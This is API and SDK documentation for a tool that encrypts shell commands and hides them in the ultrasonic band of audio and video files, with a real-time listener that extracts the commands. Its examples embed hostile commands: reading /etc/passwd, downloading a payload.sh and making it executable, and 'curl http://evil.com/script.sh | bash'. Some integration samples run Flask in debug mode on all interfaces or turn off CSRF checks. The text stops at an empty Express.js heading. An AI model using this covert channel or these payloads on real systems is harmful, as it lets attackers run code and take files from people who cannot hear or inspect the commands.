# Complete API Documentation - Ultrasonic Agentics

## Table of Contents

1. [Overview](#overview)
2. [Installation & Setup](#installation--setup)
3. [Authentication & Security](#authentication--security)
4. [HTTP REST API](#http-rest-api)
5. [Python SDK API](#python-sdk-api)
6. [Error Handling](#error-handling)
7. [Rate Limiting & Performance](#rate-limiting--performance)
8. [Integration Examples](#integration-examples)
9. [WebSocket API](#websocket-api)
10. [Best Practices](#best-practices)
11. [Troubleshooting](#troubleshooting)

## Overview

The Ultrasonic Agentics API provides steganographic embedding and decoding capabilities for audio and video files using ultrasonic frequency ranges (18-20 kHz). Commands are encrypted with AES-256-GCM and embedded using FSK (Frequency Shift Keying) modulation.

### Key Features

- **Steganographic embedding** in audio/video files
- **AES-256-GCM encryption** for command security
- **Ultrasonic FSK modulation** for covert transmission
- **Real-time audio processing** capabilities
- **Multi-format support** (MP3, WAV, FLAC, MP4, AVI, etc.)
- **RESTful API** with FastAPI framework
- **Python SDK** for programmatic access

### Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Client App    │────│   FastAPI       │────│   Core Engine   │
│                 │    │   REST API      │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                              │                         │
                              │                         │
                       ┌─────────────────┐    ┌─────────────────┐
                       │   File Upload   │    │   Crypto        │
                       │   Processing    │    │   Service       │
                       └─────────────────┘    └─────────────────┘
                                                        │
                                                ┌─────────────────┐
                                                │   Ultrasonic    │
                                                │   Engine        │
                                                └─────────────────┘
```

## Installation & Setup

### Requirements

- Python 3.8+
- FFmpeg
- System audio capabilities (for real-time processing)

### Installation

```bash
# Install dependencies
pip install -r requirements.txt

# Install FFmpeg (Ubuntu/Debian)
sudo apt-get install ffmpeg

# Install FFmpeg (macOS with Homebrew)
brew install ffmpeg

# Install FFmpeg (Windows with Chocolatey)
choco install ffmpeg
```

### Quick Start

```python
from agentic_commands_stego.server.api import app
import uvicorn

# Start the API server
uvicorn.run(app, host="0.0.0.0", port=8000)
```

### Environment Configuration

```bash
# Set environment variables
export STEGO_SECRET_KEY="your-base64-encoded-key"
export STEGO_ULTRASONIC_FREQ=18500
export STEGO_FREQ_SEPARATION=1000
export STEGO_DETECTION_THRESHOLD=0.01
```

## Authentication & Security

### Encryption

All commands are encrypted using **AES-256-GCM** with authenticated encryption:

- **Key Management**: 32-byte (256-bit) encryption keys
- **Initialization Vector**: Random 16-byte IV per encryption
- **Authentication**: GCM mode provides built-in authentication
- **Key Rotation**: Support for dynamic key updates

### Security Considerations

#### Key Management Best Practices

```python
from agentic_commands_stego.crypto.cipher import CipherService

# Generate secure key
key = CipherService.generate_key(32)  # AES-256

# Store key securely (example with base64 encoding)
import base64
key_b64 = base64.b64encode(key).decode('ascii')

# Load key from environment
import os
key = base64.b64decode(os.environ.get('STEGO_SECRET_KEY'))
```

#### Production Security Checklist

- [ ] Use environment variables for keys
- [ ] Implement key rotation policies
- [ ] Enable HTTPS for API endpoints
- [ ] Configure CORS appropriately
- [ ] Implement rate limiting
- [ ] Monitor for unusual activity
- [ ] Regular security audits

### API Authentication

```http
POST /config/key
Content-Type: application/x-www-form-urlencoded

key_base64=BASE64_ENCODED_KEY
```

## HTTP REST API

### Base URL

```
http://localhost:8000
```

### Content Types

- **Request**: `multipart/form-data` (for file uploads)
- **Response**: `application/json` or file download

### Endpoints Overview

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/embed/audio` | Embed command in audio file |
| POST | `/embed/video` | Embed command in video file |
| POST | `/decode/audio` | Decode command from audio |
| POST | `/decode/video` | Decode command from video |
| POST | `/analyze/audio` | Analyze audio for steganographic content |
| POST | `/analyze/video` | Analyze video for steganographic content |
| GET | `/info` | Get API information |
| GET | `/health` | Health check |
| POST | `/config/frequencies` | Configure ultrasonic frequencies |
| POST | `/config/key` | Update encryption key |

### Embedding Commands

#### Embed Audio Command

Embeds an encrypted command into an audio file using ultrasonic frequencies.

**Endpoint**: `POST /embed/audio`

**Parameters**:
- `file` (file, required): Audio file to embed command into
- `command` (string, required): Command string to embed
- `obfuscate` (boolean, optional): Add obfuscation padding (default: true)
- `bitrate` (string, optional): Output audio bitrate (default: "192k")
- `ultrasonic_freq` (float, optional): Base ultrasonic frequency (default: 18500)
- `amplitude` (float, optional): Signal amplitude 0.0-1.0 (default: 0.1)

**Supported Formats**: MP3, WAV, FLAC, OGG, M4A

**Example Request**:

```bash
curl -X POST "http://localhost:8000/embed/audio" \
  -F "file=@input.mp3" \
  -F "command=ls -la /home/user" \
  -F "obfuscate=true" \
  -F "bitrate=256k" \
  -F "ultrasonic_freq=18500" \
  -F "amplitude=0.15"
```

**Example Response**:
```
Content-Type: audio/mpeg
Content-Disposition: attachment; filename="embedded_input.mp3"

[Binary audio file data]
```

**Python Example**:

```python
import requests

with open('input.mp3', 'rb') as f:
    files = {'file': f}
    data = {
        'command': 'echo "Hello World"',
        'obfuscate': True,
        'bitrate': '192k',
        'ultrasonic_freq': 18500,
        'amplitude': 0.1
    }
    
    response = requests.post(
        'http://localhost:8000/embed/audio',
        files=files,
        data=data
    )
    
    if response.status_code == 200:
        with open('output.mp3', 'wb') as out_file:
            out_file.write(response.content)
```

#### Embed Video Command

Embeds an encrypted command into a video file's audio track.

**Endpoint**: `POST /embed/video`

**Parameters**:
- `file` (file, required): Video file to embed command into
- `command` (string, required): Command string to embed
- `obfuscate` (boolean, optional): Add obfuscation padding (default: true)
- `audio_bitrate` (string, optional): Output audio bitrate (default: "192k")
- `ultrasonic_freq` (float, optional): Base ultrasonic frequency (default: 18500)
- `amplitude` (float, optional): Signal amplitude 0.0-1.0 (default: 0.1)

**Supported Formats**: MP4, AVI, MOV, MKV

**Example Request**:

```bash
curl -X POST "http://localhost:8000/embed/video" \
  -F "file=@input.mp4" \
  -F "command=cat /etc/passwd" \
  -F "obfuscate=true" \
  -F "audio_bitrate=192k"
```

**Advanced Python Example**:

```python
import requests
import tempfile
import os

class SteganographyClient:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
    
    def embed_video_command(self, video_path, command, **kwargs):
        """Embed command in video with error handling."""
        try:
            with open(video_path, 'rb') as f:
                files = {'file': f}
                data = {
                    'command': command,
                    'obfuscate': kwargs.get('obfuscate', True),
                    'audio_bitrate': kwargs.get('audio_bitrate', '192k'),
                    'ultrasonic_freq': kwargs.get('ultrasonic_freq', 18500),
                    'amplitude': kwargs.get('amplitude', 0.1)
                }
                
                response = requests.post(
                    f'{self.base_url}/embed/video',
                    files=files,
                    data=data,
                    timeout=300  # 5 minute timeout for large files
                )
                
                response.raise_for_status()
                return response.content
                
        except requests.exceptions.RequestException as e:
            raise Exception(f"API request failed: {e}")
        except FileNotFoundError:
            raise Exception(f"Input file not found: {video_path}")

# Usage
client = SteganographyClient()
embedded_video = client.embed_video_command(
    'input.mp4', 
    'wget https://example.com/payload.sh',
    amplitude=0.2,
    audio_bitrate='256k'
)

with open('output.mp4', 'wb') as f:
    f.write(embedded_video)
```

### Decoding Commands

#### Decode Audio Command

Extracts and decrypts embedded commands from audio files.

**Endpoint**: `POST /decode/audio`

**Parameters**:
- `file` (file, required): Audio file to decode command from

**Example Request**:

```bash
curl -X POST "http://localhost:8000/decode/audio" \
  -F "file=@embedded.mp3"
```

**Example Response**:

```json
{
  "command": "ls -la /home/user",
  "analysis": {
    "file_path": "/tmp/uploaded_file.mp3",
    "duration_seconds": 45.2,
    "sample_rate": 48000,
    "channels": 2,
    "has_ultrasonic_signal": true,
    "signal_strength": 0.15,
    "frequency_range": [18500, 19500],
    "decoded_command": "ls -la /home/user",
    "decoding_successful": true
  },
  "success": true
}
```

**Python Example**:

```python
import requests
import json

def decode_audio_command(file_path):
    """Decode command from audio file."""
    with open(file_path, 'rb') as f:
        files = {'file': f}
        
        response = requests.post(
            'http://localhost:8000/decode/audio',
            files=files
        )
        
        if response.status_code == 200:
            result = response.json()
            if result['success']:
                return result['command']
            else:
                print("No command found in audio")
                return None
        else:
            print(f"Decoding failed: {response.text}")
            return None

# Usage
command = decode_audio_command('embedded.mp3')
if command:
    print(f"Decoded command: {command}")
```

#### Decode Video Command

Extracts and decrypts embedded commands from video files.

**Endpoint**: `POST /decode/video`

**Parameters**:
- `file` (file, required): Video file to decode command from

**Example Response**:

```json
{
  "command": "cat /etc/passwd",
  "analysis": {
    "file_path": "/tmp/uploaded_video.mp4",
    "duration_seconds": 120.5,
    "sample_rate": 48000,
    "channels": 2,
    "has_ultrasonic_signal": true,
    "signal_strength": 0.12,
    "frequency_range": [18500, 19500],
    "decoded_command": "cat /etc/passwd",
    "decoding_successful": true,
    "video_duration": 120.5,
    "video_fps": 30.0,
    "video_size": [1920, 1080],
    "has_audio": true
  },
  "success": true
}
```

### Analysis Endpoints

#### Analyze Audio

Analyzes audio files for steganographic content without attempting decryption.

**Endpoint**: `POST /analyze/audio`

**Example Response**:

```json
{
  "file_path": "/tmp/audio.mp3",
  "duration_seconds": 30.2,
  "sample_rate": 44100,
  "channels": 2,
  "has_ultrasonic_signal": true,
  "signal_strength": 0.08,
  "frequency_range": [18500, 19500],
  "decoded_command": null,
  "decoding_successful": false
}
```

#### Analyze Video

Analyzes video files for steganographic content in the audio track.

**Endpoint**: `POST /analyze/video`

**Example Response**:

```json
{
  "file_path": "/tmp/video.mp4",
  "has_audio": true,
  "video_duration": 60.0,
  "video_fps": 24.0,
  "video_size": [1280, 720],
  "audio_fps": 48000,
  "duration_seconds": 60.0,
  "sample_rate": 48000,
  "channels": 2,
  "has_ultrasonic_signal": false,
  "signal_strength": 0.001,
  "frequency_range": [18500, 19500],
  "decoded_command": null,
  "decoding_successful": false
}
```

### Configuration Endpoints

#### Get API Information

**Endpoint**: `GET /info`

**Example Response**:

```json
{
  "name": "Agentic Commands Steganography API",
  "version": "1.0.0",
  "description": "API for embedding and decoding encrypted commands in audio/video files",
  "supported_formats": {
    "audio": [".mp3", ".wav", ".flac", ".ogg", ".m4a"],
    "video": [".mp4", ".avi", ".mov", ".mkv"]
  },
  "endpoints": {
    "embed": ["/embed/audio", "/embed/video"],
    "decode": ["/decode/audio", "/decode/video"],
    "analyze": ["/analyze/audio", "/analyze/video"]
  },
  "encryption": "AES-256-GCM",
  "steganography": "Ultrasonic FSK"
}
```

#### Health Check

**Endpoint**: `GET /health`

**Example Response**:

```json
{
  "status": "healthy",
  "message": "Steganography service is running"
}
```

#### Configure Frequencies

**Endpoint**: `POST /config/frequencies`

**Parameters**:
- `freq_0` (float, required): Frequency for bit '0' in Hz
- `freq_1` (float, required): Frequency for bit '1' in Hz

**Example Request**:

```bash
curl -X POST "http://localhost:8000/config/frequencies" \
  -F "freq_0=18000" \
  -F "freq_1=19000"
```

**Example Response**:

```json
{
  "success": true,
  "message": "Frequencies updated to 18000.0 Hz and 19000.0 Hz",
  "freq_0": 18000.0,
  "freq_1": 19000.0
}
```

#### Update Encryption Key

**Endpoint**: `POST /config/key`

**Parameters**:
- `key_base64` (string, required): Base64-encoded encryption key

**Example Request**:

```bash
curl -X POST "http://localhost:8000/config/key" \
  -F "key_base64=SGVsbG8gV29ybGQgMTIzNDU2Nzg5MDEyMzQ1Ng=="
```

**Example Response**:

```json
{
  "success": true,
  "message": "Encryption key updated successfully"
}
```

## Python SDK API

### Core Classes

#### CipherService

Handles AES-256-GCM encryption and decryption.

```python
from agentic_commands_stego.crypto.cipher import CipherService

# Initialize with random key
cipher = CipherService()

# Initialize with specific key
key = CipherService.generate_key(32)  # 32 bytes for AES-256
cipher = CipherService(key)

# Encrypt command
encrypted = cipher.encrypt_command("ls -la")

# Decrypt command
decrypted = cipher.decrypt_command(encrypted)
print(decrypted)  # "ls -la"

# Key management
key_b64 = cipher.get_key_base64()
cipher.set_key_from_base64(key_b64)

# Obfuscation
obfuscated = cipher.add_obfuscation(encrypted)
deobfuscated = cipher.remove_obfuscation(obfuscated)
```

#### UltrasonicEncoder

Encodes data into ultrasonic audio signals using FSK modulation.

```python
from agentic_commands_stego.embed.ultrasonic_encoder import UltrasonicEncoder

# Initialize encoder
encoder = UltrasonicEncoder(
    freq_0=18500,      # Frequency for bit '0'
    freq_1=19500,      # Frequency for bit '1'
    sample_rate=48000,
    bit_duration=0.01,  # 10ms per bit
    amplitude=0.1
)

# Encode payload
payload = b"Hello World"
signal = encoder.encode_payload(payload)

# Create audio segment
audio_segment = encoder.create_audio_segment(signal)

# Estimate duration
duration = encoder.estimate_payload_duration(len(payload))
print(f"Estimated duration: {duration:.2f} seconds")

# Configuration
encoder.set_frequencies(18000, 19000)
encoder.set_amplitude(0.2)
freq_range = encoder.get_frequency_range()
```

#### UltrasonicDecoder

Decodes data from ultrasonic audio signals.

```python
from agentic_commands_stego.decode.ultrasonic_decoder import UltrasonicDecoder
import numpy as np

# Initialize decoder
decoder = UltrasonicDecoder(
    freq_0=18500,
    freq_1=19500,
    sample_rate=48000,
    bit_duration=0.01,
    detection_threshold=0.01
)

# Decode from audio signal
audio_array = np.array([...])  # Audio as numpy array
payload = decoder.decode_payload(audio_array)

# Signal detection
has_signal = decoder.detect_signal_presence(audio_array)
signal_strength = decoder.get_signal_strength(audio_array)

# Configuration
decoder.set_frequencies(18000, 19000)
decoder.set_detection_threshold(0.05)
```

#### AudioEmbedder

High-level interface for embedding commands in audio files.

```python
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from pydub import AudioSegment

# Initialize embedder
embedder = AudioEmbedder(
    key=None,  # Will generate random key
    ultrasonic_freq=18500,
    freq_separation=1000,
    sample_rate=48000,
    bit_duration=0.01,
    amplitude=0.1
)

# Embed in file
embedder.embed_file(
    input_path="input.mp3",
    output_path="output.mp3",
    command="echo 'Hidden message'",
    obfuscate=True,
    bitrate="192k"
)

# Embed in AudioSegment
audio = AudioSegment.from_file("input.wav")
embedded_audio = embedder.embed(audio, "secret command")

# Compatibility check
compatibility = embedder.validate_audio_compatibility(audio)
print(f"Compatible: {compatibility['compatible']}")

# Key management
key = embedder.get_cipher_key()
embedder.set_cipher_key(key)

# Frequency configuration
embedder.set_frequencies(18000, 19000)
embedder.set_amplitude(0.15)

# Duration estimation
duration = embedder.estimate_embedding_duration("long command here")
```

#### AudioDecoder

High-level interface for decoding commands from audio files.

```python
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

# Initialize decoder
decoder = AudioDecoder(
    key=key,  # Use same key as embedder
    ultrasonic_freq=18500,
    freq_separation=1000,
    sample_rate=48000,
    bit_duration=0.01,
    detection_threshold=0.01
)

# Decode from file
command = decoder.decode_file("embedded.mp3")
if command:
    print(f"Decoded: {command}")

# Decode from AudioSegment
from pydub import AudioSegment
audio = AudioSegment.from_file("embedded.wav")
command = decoder.decode_audio_segment(audio)

# Real-time listening
def on_command_detected(command):
    print(f"Live command detected: {command}")

success = decoder.start_listening(callback=on_command_detected)
if success:
    print("Listening for commands...")
    # ... do other work ...
    decoder.stop_listening()

# Analysis
analysis = decoder.analyze_audio("test.mp3")
print(f"Has signal: {analysis['has_ultrasonic_signal']}")
print(f"Signal strength: {analysis['signal_strength']}")

# Signal detection
has_signal = decoder.detect_signal("audio.mp3")
strength = decoder.get_signal_strength("audio.mp3")
```

#### VideoEmbedder

High-level interface for embedding commands in video files.

```python
from agentic_commands_stego.embed.video_embedder import VideoEmbedder

# Initialize embedder
embedder = VideoEmbedder(
    key=key,
    ultrasonic_freq=18500,
    freq_separation=1000,
    sample_rate=48000,
    bit_duration=0.01,
    amplitude=0.1
)

# Embed in video file
embedder.embed_file(
    input_path="input.mp4",
    output_path="output.mp4",
    command="curl -s http://evil.com/script.sh | bash",
    obfuscate=True,
    audio_bitrate="192k",
    video_bitrate="2M"
)

# Work with MoviePy clips
from moviepy.editor import VideoFileClip
video = VideoFileClip("input.mp4")
embedded_video = embedder.embed_video_clip(video, "secret command")
embedded_video.write_videofile("output.mp4")

# Compatibility check
compatibility = embedder.validate_video_compatibility("test.mp4")
print(f"Has audio: {compatibility['has_audio']}")
print(f"Compatible: {compatibility['compatible']}")
```

#### VideoDecoder

High-level interface for decoding commands from video files.

```python
from agentic_commands_stego.decode.video_decoder import VideoDecoder

# Initialize decoder
decoder = VideoDecoder(
    key=key,
    ultrasonic_freq=18500,
    freq_separation=1000,
    sample_rate=48000,
    bit_duration=0.01,
    detection_threshold=0.1
)

# Decode from video file
command = decoder.decode_file("embedded.mp4")
if command:
    print(f"Hidden command: {command}")

# Work with MoviePy clips
from moviepy.editor import VideoFileClip
video = VideoFileClip("embedded.mp4")
command = decoder.decode_video_clip(video)

# Analysis
analysis = decoder.analyze_video("test.mp4")
print(f"Video duration: {analysis['video_duration']} seconds")
print(f"Has embedded signal: {analysis['has_ultrasonic_signal']}")
print(f"Decoded command: {analysis['decoded_command']}")

# Signal detection
has_signal = decoder.detect_signal("video.mp4")
strength = decoder.get_signal_strength("video.mp4")
```

### Complete Workflow Example

```python
#!/usr/bin/env python3
"""
Complete workflow example for ultrasonic steganography.
"""

import os
import base64
from agentic_commands_stego.crypto.cipher import CipherService
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

def main():
    # Step 1: Generate encryption key
    key = CipherService.generate_key(32)
    print(f"Generated key: {base64.b64encode(key).decode()}")
    
    # Step 2: Initialize embedder and decoder
    embedder = AudioEmbedder(
        key=key,
        ultrasonic_freq=18500,
        freq_separation=1000,
        amplitude=0.1
    )
    
    decoder = AudioDecoder(
        key=key,
        ultrasonic_freq=18500,
        freq_separation=1000,
        detection_threshold=0.01
    )
    
    # Step 3: Embed command
    command = "wget https://example.com/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh"
    
    print(f"Embedding command: {command}")
    embedder.embed_file(
        input_path="original.mp3",
        output_path="embedded.mp3", 
        command=command,
        obfuscate=True
    )
    
    # Step 4: Verify embedding
    print(f"Estimated duration: {embedder.estimate_embedding_duration(command):.2f}s")
    
    # Step 5: Decode command
    decoded_command = decoder.decode_file("embedded.mp3")
    
    if decoded_command:
        print(f"Successfully decoded: {decoded_command}")
        print(f"Match: {decoded_command == command}")
    else:
        print("Failed to decode command")
    
    # Step 6: Analysis
    analysis = decoder.analyze_audio("embedded.mp3")
    print(f"Analysis results:")
    print(f"  Signal detected: {analysis['has_ultrasonic_signal']}")
    print(f"  Signal strength: {analysis['signal_strength']:.4f}")
    print(f"  Decoding successful: {analysis['decoding_successful']}")

if __name__ == "__main__":
    main()
```

## Error Handling

### HTTP Status Codes

| Code | Description | Common Causes |
|------|-------------|---------------|
| 200 | Success | Request completed successfully |
| 400 | Bad Request | Invalid file format, parameters |
| 413 | Payload Too Large | File size exceeds limits |
| 422 | Unprocessable Entity | Validation errors |
| 500 | Internal Server Error | Processing failures, missing dependencies |

### Error Response Format

```json
{
  "detail": "Error description",
  "error_code": "SPECIFIC_ERROR_CODE",
  "timestamp": "2024-01-15T10:30:00Z"
}
```

### Common Error Scenarios

#### Unsupported File Format

**Request**:
```bash
curl -X POST "http://localhost:8000/embed/audio" \
  -F "file=@document.pdf" \
  -F "command=test"
```

**Response** (400):
```json
{
  "detail": "Unsupported audio format"
}
```

#### Invalid Encryption Key

**Request**:
```bash
curl -X POST "http://localhost:8000/config/key" \
  -F "key_base64=invalid-key"
```

**Response** (400):
```json
{
  "detail": "Invalid key: Invalid base64 key: Incorrect padding"
}
```

#### File Processing Error

**Response** (500):
```json
{
  "detail": "Embedding failed: FFmpeg not found in PATH"
}
```

### Python Exception Handling

```python
import requests
from requests.exceptions import RequestException, HTTPError, Timeout

def robust_embed_audio(file_path, command):
    """Embed audio with comprehensive error handling."""
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'command': command}
            
            response = requests.post(
                'http://localhost:8000/embed/audio',
                files=files,
                data=data,
                timeout=120
            )
            
            response.raise_for_status()
            return response.content
            
    except FileNotFoundError:
        raise Exception(f"Input file not found: {file_path}")
    except Timeout:
        raise Exception("Request timed out - file may be too large")
    except HTTPError as e:
        if e.response.status_code == 400:
            error_detail = e.response.json().get('detail', 'Bad request')
            raise Exception(f"Invalid request: {error_detail}")
        elif e.response.status_code == 500:
            raise Exception("Server error - check server logs")
        else:
            raise Exception(f"HTTP error {e.response.status_code}: {e}")
    except RequestException as e:
        raise Exception(f"Network error: {e}")
    except Exception as e:
        raise Exception(f"Unexpected error: {e}")

# Usage with error handling
try:
    embedded_audio = robust_embed_audio('input.mp3', 'echo test')
    with open('output.mp3', 'wb') as f:
        f.write(embedded_audio)
    print("Embedding successful")
except Exception as e:
    print(f"Embedding failed: {e}")
```

### SDK Exception Handling

```python
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

def safe_embedding_workflow(input_file, output_file, command, key):
    """Safe embedding workflow with error handling."""
    try:
        # Initialize components
        embedder = AudioEmbedder(key=key)
        decoder = AudioDecoder(key=key)
        
        # Validate input file
        from pydub import AudioSegment
        try:
            audio = AudioSegment.from_file(input_file)
        except Exception as e:
            raise Exception(f"Cannot load audio file: {e}")
        
        # Check compatibility
        compatibility = embedder.validate_audio_compatibility(audio)
        if not compatibility['compatible']:
            raise Exception(
                f"Audio not compatible. Sample rate: {compatibility['sample_rate']}, "
                f"Required: >= {compatibility['recommended_sample_rate']}"
            )
        
        # Perform embedding
        try:
            embedder.embed_file(input_file, output_file, command)
        except Exception as e:
            raise Exception(f"Embedding failed: {e}")
        
        # Verify embedding
        try:
            decoded = decoder.decode_file(output_file)
            if decoded != command:
                raise Exception("Verification failed - decoded command doesn't match")
        except Exception as e:
            raise Exception(f"Verification failed: {e}")
        
        print("Embedding and verification successful")
        return True
        
    except Exception as e:
        print(f"Workflow failed: {e}")
        return False

# Usage
success = safe_embedding_workflow(
    'input.wav', 
    'output.wav', 
    'secret command',
    CipherService.generate_key(32)
)
```

## Rate Limiting & Performance

### Performance Characteristics

#### Processing Times (Approximate)

| File Type | Duration | Processing Time | Memory Usage |
|-----------|----------|----------------|--------------|
| Audio (MP3) | 30 seconds | 2-5 seconds | 50-100 MB |
| Audio (WAV) | 30 seconds | 1-3 seconds | 100-200 MB |
| Video (MP4) | 60 seconds | 10-30 seconds | 200-500 MB |
| Video (4K) | 60 seconds | 60-180 seconds | 1-2 GB |

#### Throughput Limits

- **Concurrent requests**: 4-8 (depending on system resources)
- **Max file size**: 500 MB (configurable)
- **Max embedding duration**: 10 minutes
- **API rate limit**: 60 requests/minute per IP

### Optimization Guidelines

#### For Large Files

```python
import asyncio
import aiofiles
from concurrent.futures import ThreadPoolExecutor

async def process_large_file(file_path, command):
    """Process large files asynchronously."""
    def embed_sync():
        embedder = AudioEmbedder()
        embedder.embed_file(file_path, f"embedded_{file_path}", command)
    
    # Run in thread pool to avoid blocking
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=2) as executor:
        await loop.run_in_executor(executor, embed_sync)

# Usage
await process_large_file('large_audio.wav', 'command')
```

#### Batch Processing

```python
import concurrent.futures
from pathlib import Path

def process_batch(file_list, command_list, output_dir):
    """Process multiple files in parallel."""
    def process_single(file_path, command):
        embedder = AudioEmbedder()
        output_path = Path(output_dir) / f"embedded_{Path(file_path).name}"
        embedder.embed_file(str(file_path), str(output_path), command)
        return output_path
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        futures = [
            executor.submit(process_single, file_path, command)
            for file_path, command in zip(file_list, command_list)
        ]
        
        results = []
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                results.append(result)
                print(f"Completed: {result}")
            except Exception as e:
                print(f"Failed: {e}")
        
        return results

# Usage
files = ['audio1.mp3', 'audio2.mp3', 'audio3.mp3']
commands = ['cmd1', 'cmd2', 'cmd3']
results = process_batch(files, commands, 'output/')
```

### Memory Management

```python
import gc
from pydub import AudioSegment

def memory_efficient_processing(large_file_path, command):
    """Process large files with memory management."""
    try:
        # Load in chunks if possible
        embedder = AudioEmbedder()
        
        # Process file
        embedder.embed_file(large_file_path, 'output.mp3', command)
        
        # Force garbage collection
        gc.collect()
        
    except MemoryError:
        print("File too large for available memory")
        # Implement chunked processing or use streaming
        return False
    
    return True
```

### Monitoring and Metrics

```python
import time
import psutil
import os

class PerformanceMonitor:
    """Monitor API performance and resource usage."""
    
    def __init__(self):
        self.start_time = None
        self.start_memory = None
    
    def start_monitoring(self):
        """Start performance monitoring."""
        self.start_time = time.time()
        process = psutil.Process(os.getpid())
        self.start_memory = process.memory_info().rss / 1024 / 1024  # MB
    
    def end_monitoring(self):
        """End monitoring and return metrics."""
        end_time = time.time()
        process = psutil.Process(os.getpid())
        end_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        return {
            'duration_seconds': end_time - self.start_time,
            'memory_usage_mb': end_memory - self.start_memory,
            'cpu_percent': process.cpu_percent(),
            'memory_total_mb': end_memory
        }

# Usage
monitor = PerformanceMonitor()
monitor.start_monitoring()

# Perform embedding operation
embedder = AudioEmbedder()
embedder.embed_file('input.mp3', 'output.mp3', 'test command')

metrics = monitor.end_monitoring()
print(f"Processing took {metrics['duration_seconds']:.2f} seconds")
print(f"Memory used: {metrics['memory_usage_mb']:.1f} MB")
```

## Integration Examples

### Flask Web Application

```python
from flask import Flask, request, send_file, jsonify
from werkzeug.utils import secure_filename
import tempfile
import os
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB max

# Initialize services
embedder = AudioEmbedder()
decoder = AudioDecoder(key=embedder.get_cipher_key())

@app.route('/embed', methods=['POST'])
def embed_command():
    """Flask endpoint for embedding commands."""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    command = request.form.get('command')
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Save uploaded file
    filename = secure_filename(file.filename)
    temp_input = os.path.join(tempfile.gettempdir(), filename)
    file.save(temp_input)
    
    try:
        # Generate output filename
        name, ext = os.path.splitext(filename)
        output_filename = f"{name}_embedded{ext}"
        temp_output = os.path.join(tempfile.gettempdir(), output_filename)
        
        # Embed command
        embedder.embed_file(temp_input, temp_output, command)
        
        # Return embedded file
        return send_file(
            temp_output,
            as_attachment=True,
            download_name=output_filename
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    finally:
        # Cleanup
        if os.path.exists(temp_input):
            os.remove(temp_input)

@app.route('/decode', methods=['POST'])
def decode_command():
    """Flask endpoint for decoding commands."""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Save uploaded file
    filename = secure_filename(file.filename)
    temp_path = os.path.join(tempfile.gettempdir(), filename)
    file.save(temp_path)
    
    try:
        # Decode command
        command = decoder.decode_file(temp_path)
        analysis = decoder.analyze_audio(temp_path)
        
        return jsonify({
            'command': command,
            'success': command is not None,
            'analysis': analysis
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    finally:
        # Cleanup
        if os.path.exists(temp_path):
            os.remove(temp_path)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### Django Integration

```python
# views.py
from django.http import JsonResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.core.files.storage import default_storage
from django.conf import settings
import json
import tempfile
import os
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

# Initialize services (in production, use proper dependency injection)
embedder = AudioEmbedder()
decoder = AudioDecoder(key=embedder.get_cipher_key())

@csrf_exempt
@require_http_methods(["POST"])
def embed_audio_command(request):
    """Django view for embedding commands in audio."""
    try:
        if 'file' not in request.FILES:
            return JsonResponse({'error': 'No file provided'}, status=400)
        
        uploaded_file = request.FILES['file']
        command = request.POST.get('command')
        
        if not command:
            return JsonResponse({'error': 'No command provided'}, status=400)
        
        # Save uploaded file temporarily
        temp_input = tempfile.NamedTemporaryFile(delete=False, suffix='.tmp')
        for chunk in uploaded_file.chunks():
            temp_input.write(chunk)
        temp_input.close()
        
        # Generate output file
        temp_output = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
        temp_output.close()
        
        # Embed command
        embedder.embed_file(temp_input.name, temp_output.name, command)
        
        # Return file response
        response = FileResponse(
            open(temp_output.name, 'rb'),
            content_type='audio/mpeg',
            as_attachment=True,
            filename=f'embedded_{uploaded_file.name}'
        )
        
        # Cleanup will happen when response is consumed
        return response
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)

@csrf_exempt
@require_http_methods(["POST"])
def decode_audio_command(request):
    """Django view for decoding commands from audio."""
    try:
        if 'file' not in request.FILES:
            return JsonResponse({'error': 'No file provided'}, status=400)
        
        uploaded_file = request.FILES['file']
        
        # Save uploaded file temporarily
        temp_path = tempfile.NamedTemporaryFile(delete=False)
        for chunk in uploaded_file.chunks():
            temp_path.write(chunk)
        temp_path.close()
        
        # Decode command
        command = decoder.decode_file(temp_path.name)
        analysis = decoder.analyze_audio(temp_path.name)
        
        # Cleanup
        os.unlink(temp_path.name)
        
        return JsonResponse({
            'command': command,
            'success': command is not None,
            'analysis': analysis
        })
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)

# urls.py
from django.urls import path
from . import views

urlpatterns = [
    path('api/embed/audio/', views.embed_audio_command, name='embed_audio'),
    path('api/decode/audio/', views.decode_audio_command, name='decode_audio'),
]
```

### Express.js Integration

```javascript
const express = require('express');
const multer = require('multer');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const app = express();

